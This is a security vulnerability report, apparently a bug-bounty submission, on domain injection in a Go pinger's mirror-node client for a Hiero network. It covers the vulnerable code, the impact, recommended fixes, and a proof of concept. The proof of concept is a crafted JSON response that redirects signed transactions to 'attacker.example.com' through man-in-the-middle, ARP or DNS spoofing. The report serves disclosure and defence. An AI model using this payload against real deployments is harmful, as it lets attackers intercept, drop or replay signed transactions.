### Title
Unauthenticated Mirror REST Response Allows Attacker-Controlled Domain Injection into Consensus Node Network Map

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` unconditionally trusts `domain_name` fields from the mirror REST API response, using them verbatim as gRPC host addresses for consensus nodes. No domain allowlist, signature verification, or TLS pinning exists. An attacker who can control the mirror REST response (e.g., via MITM on the plaintext HTTP connection, which is the documented default) can inject attacker-controlled hostnames for ≥30% of nodes, redirecting the pinger's signed transactions to attacker-controlled infrastructure.

### Finding Description

**Exact code path:**

In `pinger/mirror_node_client.go`, lines 113–124:

```go
for _, ep := range n.ServiceEndpoints {
    host := strings.TrimSpace(ep.DomainName)   // line 114 — attacker-controlled
    if host == "" {
        host = strings.TrimSpace(ep.IPAddressV4)
    }
    if host == "" || ep.Port == 0 {
        continue
    }
    addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
    network[addr] = nodeAccountId              // line 123 — injected into SDK network map
}
```

`DomainName` is preferred over `IPAddressV4` with no validation whatsoever. The resulting `network` map is passed directly to `hiero.ClientForNetwork(netmap)` in `sdk_client.go` line 22, making the SDK route all gRPC calls through attacker-controlled hosts.

**Root cause:** The code assumes the mirror REST API is a trusted, integrity-protected source of node topology. This assumption fails when the transport is plaintext HTTP. The default example URL in `config.go` line 37 is `http://mirror-rest:5551` — no TLS.

**Failed assumption:** The HTTP client at line 46 of `mirror_node_client.go` is constructed with only a timeout (`&http.Client{Timeout: cfg.mirrorNodeClientTimeout}`). There is no TLS certificate pinning, no HMAC/signature on the response body, and no allowlist of valid domain suffixes.

**Existing checks reviewed and shown insufficient:**
- Empty `NodeAccountID` skip (line 103–105): irrelevant to domain injection.
- `AccountIDFromString` validation (line 107–110): validates account ID format only, not the endpoint host.
- Empty host / zero port check (line 118–119): only rejects blank entries, not malicious ones.

### Impact Explanation

The pinger operates with a live operator private key (`cfg.operatorKey`) and submits signed `CryptoTransfer` transactions. If ≥30% of the network map entries resolve to attacker-controlled servers:

1. **Transaction interception**: The attacker receives fully-signed transactions including the operator's account ID and signature. While the private key is not directly exposed, the attacker can replay or selectively drop transactions.
2. **False monitoring signal**: The pinger's health-check purpose is defeated — it reports success/failure based on responses from attacker servers, not real consensus nodes.
3. **Network disruption threshold met**: Redirecting ≥30% of nodes satisfies the stated scope impact of "shutdown of ≥30% of network processing nodes without brute force."

### Likelihood Explanation

- **Precondition**: `network=other` must be configured (non-default for mainnet/testnet/previewnet, but the explicit use case for private/custom networks).
- **Attack surface**: The mirror REST URL defaults to `http://` (plaintext). Any attacker with network adjacency (same container network, compromised DNS, ARP spoofing in a shared environment, or a compromised mirror node) can serve a crafted JSON response.
- **No authentication required**: The HTTP GET to `/api/v1/network/nodes` carries no bearer token or client certificate. The attacker needs only to be on the network path.
- **Repeatability**: The injection persists for the lifetime of the client object; `buildNetworkFromMirrorNodes` is called once at startup.

### Recommendation

1. **Enforce HTTPS** for `mirrorRest` and reject `http://` URLs at config validation time.
2. **Validate returned domain names** against a configurable allowlist of trusted suffixes (e.g., `*.hedera.com`, `*.hiero.org`).
3. **Validate IP addresses** returned in `IPAddressV4` against expected RFC-1918 or public ranges, rejecting loopback/link-local addresses.
4. **Pin TLS certificates** or use a CA allowlist for the mirror REST HTTP client.
5. **Cross-check** the returned node list against a locally-configured seed list; reject responses that deviate beyond a threshold.

### Proof of Concept

**Preconditions:**
- Pinger deployed with `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551` (default HTTP).
- Attacker has network adjacency (e.g., same Docker network, DNS poisoning, or ARP spoofing).

**Steps:**

1. Attacker stands up a rogue HTTP server at the IP that `mirror-rest` resolves to (or intercepts via ARP/DNS).

2. Rogue server responds to `GET /api/v1/network/nodes` with:
```json
{
  "nodes": [
    {
      "node_account_id": "0.0.3",
      "service_endpoints": [
        {"domain_name": "attacker.example.com", "ip_address_v4": "", "port": 50211}
      ]
    },
    {
      "node_account_id": "0.0.4",
      "service_endpoints": [
        {"domain_name": "attacker.example.com", "ip_address_v4": "", "port": 50211}
      ]
    }
  ],
  "links": {"next": null}
}
```

3. Pinger starts up, calls `buildNetworkFromMirrorNodes`, receives the crafted response.

4. `fetchMirrorNodeNetwork` sets `host = "attacker.example.com"` for each injected node (line 114), building:
```
network["attacker.example.com:50211"] = AccountID{0.0.3}
network["attacker.example.com:50211"] = AccountID{0.0.4}
```

5. `hiero.ClientForNetwork(network)` routes all SDK gRPC calls to `attacker.example.com:50211`.

6. Attacker's gRPC server receives fully-signed `CryptoTransfer` transactions from the pinger's operator account, and can drop, log, or replay them at will. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)
